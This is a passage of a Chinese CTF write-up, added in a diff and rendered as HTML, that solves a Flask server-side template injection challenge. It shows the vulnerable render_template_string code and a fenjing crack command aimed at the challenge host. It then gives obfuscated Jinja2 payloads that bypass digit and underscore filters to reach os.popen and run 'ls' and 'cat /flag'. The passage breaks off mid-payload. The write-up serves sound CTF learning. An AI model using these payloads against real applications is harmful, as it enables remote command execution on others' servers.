+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="k">return</span> <span class="nx">render_template</span><span class="p">(</span><span class="s1">&#39;forbidden.html&#39;</span><span class="p">)</span>  <span class="c1"># 如果包含，渲染 forbidden.html 模板
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">        <span class="c1"># 使用 render_template_string 渲染一个 HTML 字符串，传递 command 和 css_url 参数
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">return</span> <span class="nx">render_template_string</span><span class="p">(</span><span class="nx">f</span><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;!DOCTYPE html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;html lang=&#34;en&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;meta charset=&#34;UTF-8&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;title&gt;Loving Music&lt;/title&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;link rel=&#34;stylesheet&#34; href=&#34;{css_url}&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;link href=&#34;&lt;url id=&#34;cvh0d9sc75rev485mjl0&#34; type=&#34;url&#34; status=&#34;failed&#34; title=&#34;&#34; wc=&#34;0&#34;&gt;https://fonts.googleapis.com/css2?family=Poppins:wght@400&lt;/url&gt; ;600&amp;display=swap&#34; rel=&#34;stylesheet&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/head&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;div class=&#34;container&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;h1&gt;Loving coding&lt;/h1&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;p class=&#34;emoji&#34;&gt;🧑‍💻&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">                &lt;p&gt;{command}&lt;/p&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">            &lt;/div&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &lt;/html&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="p">,</span> <span class="nx">command</span><span class="o">=</span><span class="nx">command</span><span class="p">,</span> <span class="nx">css_url</span><span class="o">=</span><span class="nx">css_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">render_template</span><span class="p">(</span><span class="s1">&#39;shell.html&#39;</span><span class="p">,</span> <span class="nx">command</span><span class="o">=</span><span class="nx">cmd</span><span class="p">)</span>  <span class="c1"># 如果是 GET 请求，渲染 shell.html 模板，传递 cmd 参数
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>显然这里漏洞点在render_template_string ，这个与ssti密不可分（render_template_string函数在渲染模板的时候使用了%s来动态的替换<a class="link" href="https://so.csdn.net/so/search?q=%e5%ad%97%e7%ac%a6%e4%b8%b2&amp;spm=1001.2101.3001.7020"  target="_blank" rel="noopener"
+    >字符串</a>，在渲染的时候会把 {undefined{**}} 包裹的内容当做变量解析替换。）</p>
+<p><a class="link" href="https://blog.csdn.net/weixin_53146913/article/details/124274968"  target="_blank" rel="noopener"
+    >Flask的渲染方法函数&mdash;render_template()/render_template_string()-CSDN博客</a></p>
+<p>所以就是打ssti(在/test路由，cmd是参数)，先fuzz一下，这些都是没过滤的</p>
+<p><img src="/images/image-20250325094722362.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325094722362"
+	
+	
+></p>
+<p>下面是过滤的（下面还一些关键词，那些无所谓，直接引号绕过了），显然，困难的是数字，下划线过滤了，因为下划线过滤了，一般用request加attr，或者编码，但是数字和点过滤了，这让我束手无策。</p>
+<p><img src="/images/image-20250325094812653.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325094812653"
+	
+	
+></p>
+<p><strong>那就直接fenjing跑！</strong></p>
+<p>一开始我直接跑fenjing跑不出，一般默认跑fenjing基本跑不出，要根据题目加点参数才行。这个fenjing跑要带路由，cookie，不然跑不出。这里我猜猜原因，这里设置了seesion会话用户是test，后面还进行了验证，所以要带上seesion才行。</p>
+<p><img src="/images/image-20250325101050597.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325101050597"
+	
+	
+></p>
+<p>fenjing如果你是pip下载就打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">fenjing</span> <span class="n">crack</span> <span class="o">--</span><span class="n">url</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">node6</span><span class="o">.</span><span class="n">anna</span><span class="o">.</span><span class="n">nssctf</span><span class="o">.</span><span class="n">cn</span><span class="p">:</span><span class="mi">23137</span><span class="o">/</span><span class="n">test</span>  <span class="o">--</span><span class="n">cookies</span> <span class="n">session</span><span class="o">=</span><span class="n">eyJ1c2VyIjoidGVzdCJ9</span><span class="o">.</span><span class="n">Z</span><span class="o">-</span><span class="n">ICRg</span><span class="mf">.6</span><span class="n">h9VWlD5DS5HIzdu7uCxabtUeVQ</span> <span class="o">--</span><span class="n">inputs</span> <span class="n">cmd</span> <span class="o">--</span><span class="n">method</span> <span class="n">POST</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>不然就命令行前加pyhton -m就行</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python -m fenjing crack --url http://node6.anna.nssctf.cn:23137/test  --cookies session=eyJ1c2VyIjoidGVzdCJ9.Z-ICRg.6h9VWlD5DS5HIzdu7uCxabtUeVQ --inputs cmd --method POST
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/images/image-20250325092040651.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325092040651"
+	
+	
+></p>
+<p>然后执行命令就行</p>
+<p><img src="/images/image-20250325092215660.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325092215660"
+	
+	
+></p>
+<p><img src="/images/image-20250325092228589.png"
+	
+	
+	
+	loading="lazy"
+	
+		alt="image-20250325092228589"
+	
+	
+></p>
+<p>这里给出payload：<code>ls</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">cmd</span><span class="o">=</span><span class="p">{{((</span><span class="nx">cycler</span><span class="p">[</span><span class="s1">&#39;next&#39;</span><span class="p">][</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="s1">&#39;GLOBALS&#39;</span><span class="o">|</span><span class="nx">lower</span><span class="o">+</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">][</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="s1">&#39;builtins&#39;</span><span class="o">+</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">][</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="s1">&#39;import&#39;</span><span class="o">+</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">))[</span><span class="s1">&#39;popen&#39;</span><span class="p">](((</span><span class="nx">lipsum</span><span class="p">()</span><span class="o">|</span><span class="nx">urlencode</span><span class="o">|</span><span class="nx">first</span><span class="o">+</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">)</span><span class="o">|</span><span class="nx">format</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))))[</span><span class="s1">&#39;r&#39;&#39;ead&#39;</span><span class="p">]()}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>cat /flag</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">cmd</span><span class="o">=</span><span class="p">{{((</span><span class="nx">cycler</span><span class="p">[</span><span class="s1">&#39;next&#39;</span><span class="p">][</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="s1">&#39;GLOBALS&#39;</span><span class="o">|</span><span class="nx">lower</span><span class="o">+</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">][</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="s1">&#39;builtins&#39;</span><span class="o">+</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">][</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="s1">&#39;import&#39;</span><span class="o">+</span><span class="nx">lipsum</span><span class="o">|</span><span class="nx">escape</span><span class="o">|</span><span class="nx">batch</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">))</span><span class="o">|</span><span class="k">list</span><span class="o">|</span><span class="nx">first</span><span class="o">|</span><span class="nx">last</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">))[</span><span class="s1">&#39;popen&#39;</span><span class="p">](((</span><span class="nx">lipsum</span><span class="p">()</span><span class="o">|</span><span class="nx">urlencode</span><span class="o">|</span><span class="nx">first</span><span class="o">+</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">)</span><span class="o">|</span><span class="nx">format</span><span class="p">(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">+</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="p">),(((</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">)</span><span class="o">|</span><span class="nx">count</span><span class="o">*</span><span class="p">(</span><span class="nx">x</span><span class="p">,</span><span class="nx">x</span><span class="p">,</span><span 